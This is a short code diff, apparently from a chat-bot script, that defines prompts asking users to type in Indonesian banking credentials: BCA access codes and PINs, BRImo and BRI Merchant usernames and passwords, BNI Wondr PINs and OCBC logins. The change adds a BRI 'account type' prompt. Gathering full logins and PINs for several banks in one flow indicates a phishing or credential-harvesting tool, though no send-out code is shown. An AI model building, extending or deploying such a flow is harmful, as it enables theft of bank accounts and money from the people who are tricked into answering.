@@ -24,7 +24,7 @@ const getSteps = (bank) => {
   if (b === 'BCA') {
     bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin', 'ibUser', 'ibPassword'];
   } else if (b === 'BRI') {
-    bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
+    bankSteps = ['jenisRekening', 'brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
   } else if (b === 'BNI') {
     bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
   } else if (b === 'OCBC' || b === 'OCBC NISP') {
@@ -67,6 +67,7 @@ const getBankSpecificLabel = (field, bankName) => {
     brimoPassword: '🔑 Masukkan Password BRImo:',
     briMerchantUser: '🏪 Masukkan Username BRI Merchant:',
     briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
+    jenisRekening: '📝 Masukkan Jenis Rekening (e.g. Britama/Simpedes):',
     pinWondr: '🛡️ Masukkan PIN Wondr (BNI):',
     passWondr: '🔓 Masukkan Password Wondr (BNI):',
     ocbcNyalaUser: '👤 Masukkan User ID Nyala (OCBC):',
